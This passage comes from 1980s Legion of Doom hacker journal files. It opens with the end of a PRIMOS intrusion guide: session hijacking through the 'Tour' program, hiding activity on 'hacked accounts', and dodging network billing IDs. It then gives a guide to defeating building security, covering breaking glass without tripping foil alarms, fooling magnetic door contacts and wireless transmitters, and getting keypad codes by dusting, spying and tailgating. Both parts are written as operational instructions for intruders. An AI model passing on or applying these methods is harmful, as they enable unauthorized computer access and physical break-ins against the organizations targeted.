+       !   PRIME        !Allows user to execute all      !
+       !                !commands, except operator cmds. !
+       !                !User can also access PRIMENET if!
+       !                !the system supports it.  Access !
+       !                !to only low level directories.  !
+       !=================================================!
+       !   ADMIN        !Access to view all directories &!
+       !                !bypass all ACL'S.  Can setup an !
+       !                !accounts on other Primos systems!
+       !                !via PRIMENET (if available).    !
+       !                !User can execute any command.   !
+       !=================================================!
+       !  SYSTEM        !Same as ADMIN, except cannot    !
+       !                !view feedback to ADMINS.        !
+       !=================================================!
+       !  RJE           !Same as games, except a RJE     !
+       !                !user can erase user log and spy.!
+       !=================================================!
+       !  TEST          !Able to access any directory,   !
+       !                !only restriction is a test user !
+       !                !is not authorized to shut down  !
+       !                !the system.                     !
+       !=================================================!
+       Note: RJE is a Remote Job Entry
+
+  Priority levels may vary on different Primos systems, they can range from
+0- to any number up to 10.  The most common range is 0-6.  On some Primos
+systems you can do a CHAP PRIORITY to see what the range is.
+
+  Ok, we have checked priorities, and the system status.  Lets move to
+directories.  To list a directory type "LD" short for List Directory.
+This will list the directory you are attached to.  In this case it
+will be your home directory.  You will get a list of files within your own
+directory.  To view someone elses directory you would type AT nameofdirectory.
+Lets say we are logged into a DEMO account.  And we would like to
+view the files in the GAMES account.  We could do either of the following:
+
+OK, AT GAMES
+
+This is telling the system we would like to default to the Games directory.
+This is similar to the Set Default name on a VAX/VMS system. (See Lex Luthor's
+Hacking VAX/VMS 3 part series for more information on VMS)
+
+or we could do
+
+OK, FUTIL
+>AT GAMES
+
+  This is the same thing, except in the first method you can still execute
+Primos commands while still attached to the Games account.  But when using
+FUTIL (File UTILity program) you can only list,  create and copy files.  To get
+out of the file utility program just hit a Control P. Here is a chart of file
+types and how to execute them:
+
+-------------------------------------------
+|   File type    |    How to execute it   |
+===========================================
+|     .CPL       | CPL pathname           |
+|     .SAVE      | SAVE pathname          |
+|     .SEG       | SEG pathname           |
+|     .BASICV    | BASICV pathname        |
+|     .TXT       | SLIST pathname         |
+|     .COM       | CO pathname            |
+-------------------------------------------
+Note: SLIST will also show the program lines of the file, whether it be a
+      CPL file or COM file.  This is a good way to learn CPL (Command Procedure
+      Language).
+
+  Most files will not have suffixes.  To execute them type "Resume pathname",
+filenames are called pathnames on PRIMOS.  Unlike VMS, the PRIMOS system
+doesn't have the type of file as a suffix.  On some files you'll get the
+suffix, but if not try: Resume pathname and that should execute the file,
+especially files with an "*" preceding them.  If a file is in the format of,
+"*filename" do "Resume *filename".  Usually basic files have an * preceding
+their titles.
+
+To create a directory type:
+
+OK, Create directname [-password] [-access]
+
+  A password can be from 1-6 letters, if I wanted to have a password on
+my directory I would do-
+
+OK, Create directname [-limp] [-access]
+
+  If you don't put in an access level, the directory will automatically be
+set to ALL access.  Here's a list of access rights:
+
+      P         =       Protect a directory
+      D         =       Delete entries from directory
+      A         =       Add entries to directory
+      L         =       Read the contents within directory
+      U         =       Attach to a directory
+      R         =       Read contents of a file
+      W         =       Edit contents of a file
+    ALL         =       All of the Above^^^^^
+   NONE         =       Denies all access
+
+  Typically, if you are logged into a DEMO account your directory will be set
+to ALL access.  If it is, someone can attach to the demo directory and
+do anything they want with it.  Here is a list of accounts and what access
+they will usually have on their directory.
+
+         DEMO      =    ALL
+         GAMES     =    LUR
+         PRIME     =    ALL
+         SYSTEM    =    LUR
+         ADMIN     =    NONE
+         TEST      =    LUR
+         JBB       =    NONE
+         RJE       =    LUR
+
+  Most directories have LUR access which is access to read contents of the
+directory, attach to the directory, and read contents of a file.  If
+you have enough privileges (priority levels) you can do the following to
+change the access rights:
+
+OK, Set_Access ALL [-LUR]
+
+  This is setting access from ALL to LUR.  ALL was the present access, now we
+changed it to LUR.  You should only do this if it's your own personal account
+as changing access rights on hacked accounts could lead to your detection and
+subsequent expulsion from the system.
+
+  To create a file, preferably a text file, type "Mail pathname", then you will
+be thrown into the Mail subsystem which I believe is version 3.1 now.  You can
+type in all the info you want, when finished hit a Control-P.  It will ask you
+for a pathname to save it to.  Enter the name you would like.  It will look
+something like this:
+
+OK, Mail DOE
+
+  Mail 3.1
+>Hello.  This is your system operator.  Any ideas on how to keep those
+>pesky little computer criminals out of our system?
+>Comments can be directed to SYSTEM.
+Enter Filename: Pesky.Txt
+
+The above method is rather primative but works good if you are only creating a
+text file.  It is a common method used on version 18, and is easy to perform.
+The other method is more common on version 19, and is commonly used today.
+
+OK, Create Test.Txt
+OK, Ed
+
+EDIT
+$
+Note: $ is not dropping you into DCL, so you DCL programmers are out of
+      luck (chuckle).
+
+  From the $ prompt you can type 'help' to get a list of commands which can be
+used in the Editor.
+
+$ (return)
+
+  By hitting return we are given the "&" prompt, here we can input our
+file.  Or if you know CPL you can start programming.  Do not hit return
+on a blank line or you will be thrown into the main Editor prompt ('$').
+
+& Hello this is Bif (the system operator) I am testing the Editor
+& because we have added new enhancements.  This is only a test.
+& (return)
+
+  Thus by hitting return we are given the $ prompt once again.  To
+save our file we can type-
+
+$ Save Test
+
+  In this case the filename is test.  The system will reply by saying
+'Test Saved'.  The file should be located at the end of the files list
+when you List files.
+
+  To make sure the contents are saved type "Slist Test.Txt", it will display
+the text you typed in mail or the editor.  A couple of important notes:
+
+1: Never use a "?" anywhere in the file, or it will erase all of the contents
+   in the file.
+2: Never hit a c/r twice.  In other words if you hit a c/r on a blank line the
+   system will recognize this as mail and will send it to the name you entered.
+
+  If you want to make a basic program or basicv type "Basic" or "BasicV"
+at the "Ok," prompt and you will be thrown into that language.  If you
+would like to make a CPL program you can enter it from the main prompt since
+that is the default language for Primos.
+
+  To delete a file just type "Delete filename".
+
+  To get a list of directories with their ACLs (Access Control Lists) type
+"List_Access".  It would look something like this:
+
+OK, LIST_ACCESS
+
+      ACL  "<Current Directory>":
+
+      ADMIN : NONE
+       DEMO : LUR
+     SYSTEM : LUR
+     ROBERT : ALL
+      GAMES : LUR
+      PRIME : ALL
+
+
+  To get a listing of just files type "Listing", it will give you a list
+of files in the directory you're attached to.  The only difference between
+this method and "LD" is that LD tells you what access rights is on that
+directory.
+
+<Tour Program>
+
+  On some Prime systems you may find a program located within the Demo or Games
+account.  The name of the program is "Tour" and you can execute it by doing CPL
+Tour.  The program will be inputing commands and the system will execute them.
+ There is a bug within that program which can be used to your advantage.  First
+execute it by doing CPL Tour, once the program has begun it will have a couple
+of pauses (while it is loading).  First hit 3 Control P's.  By doing this you
+are breaking out of the program.  Next, attach to the SYSTEM directory.  Once
+attached, SLIST the Tour program (Slist Tour).  When it begins listing the file
+do a Ctrl-P again.  Now, go into the editor (ED).  When you receive the $
+prompt hangup on the system.  The system is now hung in the Editor, and the
+Tour program is still executing (from the Demo or Games account). You must call
+right back (and prey that the line hasn't been captured by a system operator).
+You will be put right into the tour program, while it is being executed.  You
+will need no pw to login as you are attached right to it.  You now have access
+to write and read anything your little heart desires.  If you plan on trying
+this, do it at night, since you will most likely be the only one on the system.
+ Always do it on a 1 line system.  Never on a Prime that is used constantly
+(unless you have perfected this method).  Remember to call right back after you
+have hung up, or someone like BIF may call and wonder why he did not get the ID
+prompt.  So be careful.
+
+  I also know different ways you can modify the tour program to have
+a little fun (using CPL commands) but due to obvious reasons I will not
+publicize the lines.  If you are interested please get in contact
+with me.
+
+<Message>
+
+  To send a message to someone on the system type "Message username". It would
+look something like this:
+
+OK, Message PRIME
+Hi, can you tell me why the system was down last week.
+
+Note: Remember DON'T use ?'s.
+
+  The user PRIME will receive the message, unless he's busy or has executed
+  command which refuses messages.  It would look like this:
+
+OK, Message Prime
+Hi, can you tell me why the system was down last week.
+
+User Prime not accepting messages
+
+  If you do not receive that message then the user will get your message. This
+is like Phone username on VMS, except on a VMS it looks better (chuckle).
+
+<Mail>
+
+  To send mail you type: "Mail xxxxx".  If I wanted to send mail to user
+SYSTEM, I would type "Mail System", I would be thrown into the mail subsystem.
+To end a message hit a c/r on a blank line.  You will be notified when you get
+mail when you first logon.  It will say "(mail waiting)".  To read it type
+"Mail".  If you have no mail and you type Mail it will say "sorry no mail
+today".  Once again no ?'s are allowed or the contents of the mail will be
+erased.
+
+<Status>
+
+  Status followed by a topic will give you a system status on that topic.  You
+can get information on the following using Status-
+
+Status ALL        =      Information on who is logged in and devices.
+Status DI         =      Information on devices, what devices are in use.
+Status SYSTEM     =      Information on what version of Primos is being run.
+Status NETWORK    =      Information on Netlink, and network nodes.
+
+  There are others but these are probably the most important, and of course,
+"Status Users" which I mentioned earlier, which will give you a list of users
+currently logged in.
+
+<Change_Password>
+
+  Allows a user to change his password.  It will look something like this:
+
+OK, Change_Password
+Old Password:Z102345
+New Password:
+Verification :
+
+  Notice how new password and verification don't echo, this is for security
+purposes so don't be alarmed.  Changing passwords of hacked accounts is not a
+good idea. We don't want to get detected now do we?
+
+<Info>
+
+  Gives info on the system. ie-who it belongs to, what version its running
+on and new features.
+
+<Languages>
+
+  Gives a list of languages the system supports.
+
+<Help>
+
+  Gives a list of help commands and a small description.
+
+
+<Netlink>
+
+  By typing Netlink at the main prompt (OK,) you will be thrown into the
+Netlink utility.  Netlink is found on Primenet (which is the networking
+software for Primes).  Netlink is used to communicate with other remote
+systems.  You will find the netlink utility on most packet networks, since
+there is much use for it there.  Netlink can be accessed by all users on
+the system.  Once netlink is typed you will get a message, similar to:
+
+Netlink version x.xx
+>(this being the main prompt)
+
+  Once again on-line help is available if you have no idea what you are
+doing.  To call another system, you would use the NC xxxxxx format.
+If you were on Telenet using Primenet supporting the Netlink utility you
+could call any system on Telenet.  For example if I wanted to call my
+favorite VMS I would type-
+
+>NC 201111
+
+  201111 being the address.  You will get a pause for about 5 seconds and you
+will be connected to the remote system.  It is fairly slow, but it is
+sufficient.  The whole process would look something like this-
+
+OK, NETLINK
+
+Netlink [Version 1.x]
+
+>NC 201111
+<Pause for about 5 seconds>
+
+Username:
+Password:
+
+  Username and Password shows that I have connected to the Vax running VMS. I
+would log onto the remote system (the VMS in this case) like I would any other
+time.  Once I am done looking around on the remote system I can just logoff by
+doing a Control P (this will put you back into the utility), or I could just
+logoff properly by using the VMS logout command and be put back into the
+Netlink utility program.
+
+  If you ever receive the message "WILL NOT ACCEPT COLLECT CONNECTION" from a
+system off of Telenet, you can just reverse the charges to the Prime you are on
+and log onto the remote system.  You can do this by using the NC format above.
+This allows you to bypass the need for a Telenet ID.
+
+  Netlink won't compare to something like DECNET but it gets the job done.
+Remember if you aren't too sure what you are doing just type "help" for on-line
+help.  To exit the Netlink utility type "Quit" or just hit Control-P.  This
+will give you the main prompt once again.
+
+<Upcase/Lowcase>
+
+  Toggles upper and lower case.
+
+<Control characters>
+
+Control S = Pauses Text
+Control P = Aborts Text or Utility
+Control Q = Resumes Text
+
+<Author Notes>
+
+  If you gain access to Primos supporting on-lines games, which can be found by
+(AT)taching to the Games directory.  There may be a game called "FRITZ", it's a
+fun game dealing with questions on the Primos system.  It can also test your
+knowledge on the system.
+
+  Usually if a person hangs up on the system without properly logging off you
+may be able to call the system and be attached to that account.  This usually
+works on systems with one line.  I called a Primos one day and was attached to
+a system account modifying a config program.  It was interesting...
+
+There are many Prime systems on Telenet so I suggest getting ahold of the
+updated LOD/H Telenet Directory from Issue I and jot down a few.  Preferably
+Primenet, since they support the Netlink utility.
+
+============================================================================
+
+Here's a list of some major differences between PRIMOS version 18.x.xx and
+Version 19.x.xxx
+
+ 1.  Version 19 supports Access Control Lists, which allows the user to set a
+     specific access right on his/her directory.
+ 2.  Version 19's security has been tightened.  A user will be prompted with
+     the password prompt.  A user is usually allowed only 1 unsuccessful login,
+     if the ID or password is incorrect the user will be logged off.
+ 3.  Once a user has tried to execute a command/file without sufficient
+     access rights he will be logged off of the system.  The account will
+     automatically be suspended until an operator has contacted the user.
+ 4.  Users have to change their password every 30 days.
+ 5.  The "CHAP" command can be executed by users to toggle their priority
+     level.
+ 6.  Netlink has been enhanced with more commands.
+ 7.  A primary password may be used for better security.
+ 8.  After logging out you will be disconnected from the system, rather
+     than prompted with the ER! prompt.
+ 9.  Dec VT132 is the commonly used operator terminal on version 19.
+10.  There have been new enhancements to the editor.
+=============================================================================
+
+  As you can see, PRIMOS is a very versatile system. It's not very popular
+among hackers since there hasn't been too much information released on it.
+Most commands will be the same on version 18, if not just execute the Help
+file. The final element to PRIMOS will be alarm (it will be similar to the one
+on VMS).  I will go a little more in-depth on the ALARM system in Part II (I
+will have more information on it, and by that time it will be inserted in later
+revisions of version 20).  Basically the alarm will record all unsuccessful
+logins and will alert the operator at the terminal.  The alarm will be a
+standard part of PRIMOS and can not be shut on and off, from a reliable source,
+the alarm may come in a different package.
+=============================================================================
+
+Part II:  I will discuss new commands, creating accounts, go more in-depth on
+          the Netlink utility, and any other changes in PRIMOS Version 20.
+
+
+Until then....
+
+You can reach me via the TJ staff account, for questions, requests for more
+information, and corrections to this article.
+The LOD/H Technical Journal: File #5 of 10 (ISSUE #2)
+
+
+             Lex Luthor and The Legion Of Doom/Hackers Present:
+
+             Identifying, Attacking, Defeating,  and Bypassing
+             Physical Security and Intrusion Detection Systems
+
+                          PART II: THE EXTERIOR
+
+
+
+INTRODUCTION:
+-------------
+
+The 'exterior' refers to the area directly outside of a building and the things
+within the building which are on the exterior. These obviously are: doors, air
+conditioning ducts, windows, walls, roofs, garages, etc. I don't believe the
+word 'exterior' is the exact definition of what this article will encompass,
+unlike the 'perimeter', but it's the best I could come up with. This article
+primarily is of an informative nature, although methods of "attacking,
+defeating, and bypassing" will be explained. Its purpose is not specifically to
+encourage you to breach a facility's security, although I acknowledge that it
+could be used as such. Some of the devices mentioned in the physical security
+series are used in homes as well as corporate, industrial, and military
+installations, but my aim is specifically towards the commercial aspect of
+buildings, not homes and apartments. Entering a facility to obtain information
+such as passwords or manuals is one thing, breaking into someones' home to
+steal their personal belongings is another.
+
+
+THE EXTERIOR:
+-------------
+
+A facility's second line of defense  against intrusion is its' exterior.  The
+exterior may have any or all of the following:
+
+* Window breakage detectors
+
+* Keypad systems
+
+* Card access control systems
+
+* Magnetic locks and contacts
+
+* Security lighting and CCTV
+
+CCTV which is also used, was mentioned in Part I: The Perimeter.
+Card Access Control devices will be mentioned in Part III: The Interior.
+
+
+WINDOWS:
+--------
+
+Windows are a large security hole for buildings. You may notice that many phone
+company buildings and data processing centers have few if any windows. There
+are two things that can be done to secure windows aside from making sure they
+are locked. One is to make them very difficult to break, and the other is to
+detect a break when and if it occurs. Here is a quick breakdown of the common
+types of glass/windows in use today:
+
+Plate glass: Can be cut with a glass cutter.
+Tempered: Normally can't be cut. Breaks up into little pieces when broken.
+Safety: You need a hatchet to break this stuff.
+Wire: This has wire criss-crossed inside of the glass, making it very hard to
+break, and even harder to actually go through the opening it is in place of.
+Plexy: Very hard to break, doesn't really shatter, but can be melted with the
+use of a torch.
+Lexan: This is used in bulletproof glass. One of the strongest and most secure
+types of glass.
+Herculite: Similar to Lexan.
+
+
+Foil tape:
+----------
+
+This is by far the most common, and probably the most improperly installed form
+of glass breakage detection, which also makes it the most insecure. This is
+usually a silver foil tape about 5/16" wide which should be placed on the whole
+perimeter of a glass window or door. In the case of plexyglass or a similar
+material, the tape should be placed in rows separated by 6-12 inches.
+
+The older foil was covered with a coating of eurathane or epoxy which enabled
+it to stick onto the glass. The newer foil has an adhesive back making
+installation much easier. There should be two connectors which are located at
+the upper top part of a window, and the lower part of the window which connects
+the foil to the processor, thus, completing the circuit. Foil may or may not
+have a supervised loop. If it is supervised, and you use a key to scratch the
+foil (when it is turned off) making a complete break in it, an alarm will sound
+when it is turned on.
+
+Foil is commonly used as a visual deterrent. Many times, it will not even be
+activated. The easiest way to determine if the facility is trying to 'B.S.' you
+into thinking they have a security system, is to see if there are any breaks
+in the foil. If there is a clean break, the 6-12V DC current which is normally
+making a loop isn't. Thus, breaking the glass will do nothing other than make
+some noise unless you take steps against that happening.
+
+As was stated, foil is the most improperly installed type of glass breakage
+detection. When it is installed improperly, it will not cover all the area it
+should. An easy way to defeat this is by the following diagram:
+
++-------------+
+! ........... !
+! .         . !  . = foil tape
+! . put     . !  - = top/bottom of door
+! . contact . !  ! = sides of door
+! . paper   . !  / = dividing line between 2 pieces of contact paper
+! . in      . !  $ = ideal places for initial breakage
+! . this    +-!  ' = clear area or outline of second piece of contact paper
+! . area    ! !  <-- door handle
+! .         +-!
+! .         . !
+! ........... !
+!/////////////!
+!'''''''''''''!
+!'           '!
+!$'''''''''''$!
++-------------+
+
+
+As you can see, the installer neglected to place the foil all the way down to
+the bottom of the glass door. There is enough room for a person to climb
+through. They may have thought that if someone broke the glass, it would all
+break, which is normally correct. But if you obtain some strong contact paper,
+preferably clear, adhere it to the glass as shown, and break the bottom part at
+the '$' it will break up to the '/' line and thats it. Thus, leaving the foil
+in-tact. This will work on tempered glass the best, and will not work on Lexan
+or Plexyglass. There is a transparent window film with a break strength of up
+to 100 pounds per square inch which can be obtained from Madico, Inc. It is
+called, Protekt LCL-400 XSR, and makes glass harder to break and stays
+essentially in place even when broken. This can be used in place of the contact
+paper. Obviously, it is also used to protect glass from breakage.
+
+Audio discriminators:
+---------------------
+
+What these do is to compare the frequency of the sound that glass makes when it
+breaks, to the actual breakage of glass. This frequency is relatively unique,
+and can accurately determine when and if glass actually breaks. Your best shot
+at defeating this, is to do the same thing as mentioned above. Cover the glass
+with a film which will keep the glass in place after breaking it. If you break
+it properly, the frequency will not match that of glass breaking when it is not
+held in place.
+
+Glass shock sensors:
+--------------------
+
+These devices detect shock disturbances using a gold-plated ring that "bounces"
+off a pair of normally closed gold-plated electrical contacts. This will send
+a signal to a Signal Processor (SP) which determines whether an alarm condition
+exists. There are two settings the SP can be set to which are:
+
+SHOCK-BREAK: This mode requires an initial high energy shock, followed by a
+very low engery shatter. The shatter must occur within about 1 second before
+an alarm can occur.
+
+SHOCK-ONLY: An alarm will occur once the first shock is detected. This may or
+may not be accompanied by a shatter.
+
+Obviously the more secure setting for a facility would be shock-only. Though,
+both are equally dangerous for an intruder. The methods mentioned earlier about
+preventing the glass from shattering will not work when this device is used in
+the shock-only mode. It may work, depending on the type of glass, if it isn't
+in the shock-break mode.
+
+These devices are usually found protecting large plate glass and multi-pane
+windows. They are roughly 2 inches by 1 inch and can be mounted on the frame of
+a window, between two windows, or on the glass itself. These sensors can cover
+up to 150 square feet of glass.
+
+These are the best of the lot for window breakage detection. Most devices have
+a constantly supervised loop, and if you cut a wire, that loop will break, and
+cause an alarm condition. They are typically placed somewhere on the window
+pane and not on the window, thus, making them harder to visually detect...from
+the outside that is. Though from close inspection, you may be able to determine
+if these are in place. Obviously they can easily be seen from the inside...
+
+The sensor is normally placed no more than a couple of inches from the glass.
+If it is too far away, or if you can move one over 4 inches from the glass, its
+detection capability is somewhat diminished. It is probably screwed in, and has
+an adhesive backing, so moving it may not be too easily accomplished. False
+alarms are not common, unless the windows rattle. There are sensors available
+which are not as sensitive, and will not "overreact" to slight vibration, these
+are called "damped" sensors.
+
+
+MAGNETIC CONTACT SWITCHES:
+--------------------------
+
+The word "contact" is somewhat contradictory to how these devices are commonly
+used. In most cases, the magnet and the switch are not in physical contact of
+each other, rather, they are in a close proximity of each other, although
+there are some models which are indeed in contact with each other. There are
+various types and levels of security that these devices possess.
+
+They can be surface mounted (floor or wall mounted) or concealed (recessed).
+The most common are surface mounted which are placed on top of the door. When
+inspecting for these devices, examine the whole perimeter of the door, from top
+to bottom. Most doors have a +/- 1/4" gap all the way around, in which you
+should also check for concealed contacts. These are round cylinders that are
+recessed into the door or wall, which obviously makes them less visible. The
+other contacts range from miniature, with dimensions as small as 1x1/4x1/4"
+to the larger ones at 5x2x1". They are usually in colors of off-white, grey,
+and brown and are mounted with nails, screws, double sided tape, or are epoxied
+onto the door or wall surface(s). The switches are hermatetically sealed, as
+are the glass breakage detectors mentioned earlier, can operate in moist or
+dusty areas, are corrosion resistant and have indoor/outdoor use. They can also
+be used on windows, fence gates, truck trailors, boats, heavy equipment, safes,
+and vaults.
+
+The different types of devices in order of least to most secure are:
+
+1) Standard Magnetic Contacts: These consist of one reed switch and one magnet.
+   They may be defeated with the use of a second magnet which would be placed
+   in the vicinity of the switch, while opening the door or window and while
+   closing them also. This way, the switch never detects the abscense of the
+   magnet, thus, no alarm occurs.
+
+2) Biased Magnetic Contacts: These consist of one reed switch with a "biasing"
+   magnet that changes the state of the reed switch. The magnet is then placed
+   at the correct distance to offset the bias magnet, creating a "balanced"
+   condition. The switch can be defeated with the use of a single magnet. The
+   trick is to:
+
+     A) You must have the correct size magnet, which can be accomplished by
+        obtaining the same type or model as what is in place.
+
+     B) You must determine the correct polarity which may be accomplished with
+        either a compass, or if the alarm is not activated, (possibly during
+        normal business hours), by opening the door and placing your magnet
+        near the device's magnet and determine the polarity. If you do not have
+        much time, then its a 50-50 shot.
+
+     C) The last criteria is to keep the magnet at the same or close to the
+        same distance from the switch as the original magnet was. In some cases
+        the device will be placed in such a manner that correct placement of
+        the second magnet will be difficult if not impossible.
+
+3) Balanced Magnetic Contacts: These consist of one biased reed switch and one
+   unbiased reed switch. The second reed will be of the correct sensitivity
+   and position so as to not operate with the actuator magnet. It must also
+   operate with the addition of a second magnet. It could be defeated by a
+   single magnet that is moved into place as the door is opened. This requires
+   coordinated movement of the door and magnet.
+
+4) Preadjusted Balanced Magnetic Contacts: These consist of three biased reed
+   switches and may have an optional fourth tamper reed. Two reeds are
+   polarized in one direction and the third is polarized in the opposite
+   direction. The housing consists of three magnets with the polarity that
+   corresponds to the switches. It is preadjusted to have a fixed space between
+   the magnet and the switch. This is the most secure type of magnetic contact
+   switch. The three-reed type could be defeated by using one of its own
+   magnets, but not a bar magnet. The type with four reeds cannot be defeated
+   with either of the two magnets because the fourth reed will activate when
+   a magnet is brought within actuating distance. If you are able to determine
+   which is the tamper reed, you can try to keep the three magnets in contact
+   with the corresponding reeds. At the same time you must have the correct
+   polarity, and in the process, not activate the tamper reed. If you
+   accomplish those, you may be able to defeat it. This will most likely
+   require two people and a bit of luck.
+
+   The most secure devices are made of die cast aluminum instead of plastic,
+   are explosion proof (for vaults and safes), have terminals mounted inside
+   the housing which provides protection from tampering and shorting, and have
+   armored cabling.
+
+
+A wider break distance will prevent fasle alarms due to loose fitting doors,
+thus, if the door is loose fitting it may have a wide break distance. The wider
+the break distance, the easier it is to defeat. This will allow you to
+introduce another magnet in cramped places since the door can be opened a wider
+distance before an alarm condition occurs.
+
+Some devices allow the installer to adjust the gap with a screwdriver instead
+of placing the switch a certain distance from the magnet. In some devices, use
+of any ferrous (Iron) material in the vicinity of the switch can cause a change
+in gap distance. As a gap is increased, the switch may bias and latch. When
+latched, the switch will remain closed even when the magnet is removed!! This
+means that when you open the door, it thinks that the door is closed, and you
+are able to stealthily go thru the door. You can test for a latched condition
+by removing the magnet (opening the door) and using a Volt Ohm Meter, if it
+reads INFINITY, the switch is OK. If not, it may be latched. If you can adjust
+the gap to the point of it being latched, without being noticed, you've got it
+made.
+
+
+Wireless Switch Transmitters:
+
+These are essentially the same as the other devices mentioned except that they
+use an FM digital signal for alarm conditions (a door or window open) and for
+maintenance conditions (low battery, transmitter malfunction/removal, long term
+jamming, etc). There should be continuous polling and a maintenance alarm will
+occur if the signal is missing for a few minutes. The transmitters are usually
+powered by a couple of AAA 1 1/2V pen cells, which can last a few years. Most
+devices will send out a signal after a specific interval. Common intervals are
+about every 30 seconds. You can verify if the device is indeed sending out a
+signal by placing a milliammeter capable of reading 10 ua in series with the
+batteries and reading the discharge current. If it occurs every 30 seconds,
+then it is sending out a signal every 30 seconds. A hint that this type of
+device is in use, is since range generally decreases as a transmitter gets
+closer to the floor, the transmitter will be placed as high as possible. The
+transmitter probably has a range of about 200 feet, although some environments
+may reduce this range due to construction materials inherent in the building.
+The frequency should be in the 314 MHz range.
+
+As was mentioned, these are the same as regular magnetic contact switches
+except that there is a transmitter instead of a wire for transmitting alarm and
+maintenance conditions, thus, the switch can be defeated in the same manner as
+has been previously stated. Defeating an X-mitter is much easier than defeating
+a wire. You can defeat the transmitter if you can sufficiently block or
+diminish the signal strength so that the receiver is unable to receive it.
+Radio waves have a tendency to bounce and reflect off of metallic surfaces,
+which includes foil, and pipes. If you have located the transmitter, which
+should be attached to or near the actual contact, you can block or jam the
+signal as you open the door. Hopefully this will be between the 30 second
+interval that it sends an "i'm ok" signal to the receiver, but it's not
+critical to do so. As was stated, most receivers will not cause an alarm
+condition if it doesn't recieve a signal once or twice, but after a few minutes
+it will. So, as you open the door, it tries to send the signal, you block or
+jam it, and you slip through without detection.
+
+This information can also apply to security relating to the 'interior' of a
+facility, ie. Part III of this series. Many of the techniques for defeating
+magnetic contact switches are geared toward being inside the facility. Many
+facilities have switches on doors to monitor movement of personnel within the
+facility.  But it also is used on the exterior and some methods will work on
+doors and possibly windows on the exterior. Of course, you have to have a way
+of opening the door, and that follows.
+
+
+DOORS AND LOCKS:
+----------------
+
+As you know, doors are the primary entrance point into a building. Since they
+are the primary target for unauthorized entry, they have the most security
+added. I am not going to mention anything about the art of picking locks.
+Although mechanical locks and keys have been the most common type of security
+used in the past as well as today, I am going to concentrate on the more
+advanced security systems in use.
+
+
+Pushbutton keypad locks:
+------------------------
+
+There are two types, mechanical and electronic. I will go into detail about
+each. I will give you a few examples of these devices which comes directly from
+brochures which I have been sent. I am merely summing up what they said.
+
+
+Electronic:
+
+
+Securitron DK-10:
+
+This is a unit which has dimensions of 3x5x1". It has a stainless steel keypad
+which is weatherproof, mounts via hidden screws and has no moving parts. The
+keypad beeps as each button is pressed, and an LED lights when the lock is
+released. It is slightly different in appearence than most other electronic
+keypads:
+
++----+
+! 1A !  Each block (1A/B2) is one button. Thus, there are 5 buttons total on
+! B2 !  this device. The "/"'s at the bottom of the device represents the name
+!    !  of the company and possibly the model number of the device.
+! 3C !  (ie. Securitron DK-10). It has 2-5 digit codes. Thus, a 2 digit code
+! D4 !  will have a maximum of 5 the the 2nd power (5 squared=25) combinations.
+!    !  Of course it increases as the number of digits used increase.
+! 5E !  This unit has an 11 or 16 incorrect digit threshold. If it is reached
+! F6 !  a buzzer sounds for 30 seconds during which it will ignore any entries.
+!    !  When a valid code is entered, the lock is released for a 5, 10, 15 or
+! 7G !  20 second interval.
+! H8 !
+!    !
+! 9K !
+! L0 !
+!    !
+!////!
+!////!
++----+
+
+
+Sentex PRO-Key:
+
+This device has a keypad resembling one of a payphone. It is a sealed, chrome
+plated metal keypad. It has the standard 10 digits with * and #. It can have
+up to 2000 individual codes with a lenght of 4 or 5 digits. It allows 8 time
+zones, "2-strikes-and-out" software which is its invalid code threshold, and
+anti-passback software.
+
+
+Obtaining codes--
+Your aim is to obtain the correct code in order to open the door. Plain and
+simple. There are various methods in which you can accomplish this. You can try
+to obtain a telescope or similar device and attempt to get the exact code as it
+is being entered. This is obviously the quickest method. If you cannot discern
+the exact code, the next best thing is to determine exactly how many digits
+were entered, since most devices have variable code lengths. If you can make
+out even one digit and when it was entered, you will substantially reduce the
+possibilities. Another method is to put some substance on the keypad itself,
+which preferably cannot be noticed by the user. After someone enters a code,
+you can check the keypad to see where there are smudges or if you use what the
+police use to find fingerprints, you can see what digits were pushed, although
+you will have no idea in what order. This will drastically cut down the combos.
+Say that someone enters a 5 digit code on a 10 digit keypad. You check the
+keypad and see that, 1,2, 4, 7, and 9 were pushed. If you attempted brute
+force, you will have 25 combinations to try. If a 4 digit code 'appeared' to be
+entered, as 0, 2, 4, 8 were 'smudged', it is possible that one of the digits
+were pushed twice. Keep that in mind. A way to know for sure would be to clean
+the pad and 'dust' it, most fingerprints will be clear, but one will be less
+clear than the others. Thus, you can be reasonably sure that the digit which is
+smudged was pressed twice.
+
+Thresholds--
+Brute force attempts on electronic keypads is suicide. Once a certain number of
+invalid attempts has been reached, it will probably be logged and a guard may
+be dispatched. Your best bet is to try once or twice, wait (leave), try once
+or twice again, wait, etc. Sooner or later you will get in.
+
+Auditlogs--
+Many of these devices are run on micro's. The software that runs these devices
+allows for an increased ability to monitor the status of these devices. They
+can track a person throughout the facility, record times of entry and exit,
+and when the maximum invalid code threshold is reached.
+
+Anti-passback--
+This term is commonly used in card access control, but it applies differently
+to keypads. This feature prevents the use of two codes being used at the same
+time. That is, Joe Comosolo uses code #12345 and enters the building. Then,
+you enter Mr. Comosolo's code, #12345 but the system knows that Joe is already
+in the building, and has not entered his code before leaving. Thus, you do not
+gain access, and that action is most likely recorded in the audit log. This
+option will only be in effect when:
+
+1) Each individual has a different code.
+
+2) There is a keypad used for entry, and a keypad used for exit.
+
+
+Tailgating--
+This occurs when more than one person enters through a controlled access point.
+Joe enters his code, and goes into the building. You follow Joe, and make it
+in just before the door closes, or in the case of the devices waiting 10 or 20
+seconds before the door locks again, you let it close, and open it before it
+locks.
+
+Open access times--
+During peak morning, noon, and evening hours, a facility may set the system to
+not require a code during, say, 8:55AM to 9:05AM, thus, enabling most anyone to
+gain entry during that time.
+
+
+Hirsch Electronics Digital Scrambler:
+
+This has a 12 button arrangement with the addition of a 'start' key. This is
+probably the most secure type of keypad security system in use today. It only
+allows a viewing range of +/- 4 degrees horizontally and +/- 26 degrees
+vertically. This means that it would be very difficult to watch someone enter
+their code, thus, eliminating the 'spying' technique mentioned earlier.
+The buttons on the keypad remain blank until the start button is pressed. Then,
+instead of the numbers appearing in the usual order, they are postitioned at
+random. A different pattern is generated each time it is used. The numbers are
+LED's in case you were wondering. This eliminates the 'dusting' technique which
+can be used on the other types of keypad systems.
+
+The Model 50 allows control of 4 access points and has 6 programmable codes.
+The Model 88 controls 8 doors and has thousands of codes. The features that
+this device has makes it very difficult to do anything but use brute force to
+obtain the code, but since it is controlled and monitored by a computer, the
+audit logs and maximum invalid code threshold can put a stop to that method.
+The other alternative, which applies to any of these systems, is to socially
+engineer the code from someone, or if you know someone, they may give you it.
+Both methods are not ideal. I have come up with a way to reduce the
